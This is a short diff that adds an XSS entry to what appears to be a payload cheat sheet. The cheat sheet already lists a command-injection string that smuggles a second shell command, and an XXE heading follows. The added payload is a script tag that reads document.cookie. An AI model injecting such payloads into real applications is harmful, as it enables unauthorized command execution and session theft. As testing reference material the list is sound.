@@ -271,6 +271,11 @@ e dbg.profile=profile.rr2
 "; echo $(ls) #
 ```
 
+#### XSS
+```
+<script>alert(document.cookie)</script>
+```
+
 #### XXE
 
 ```
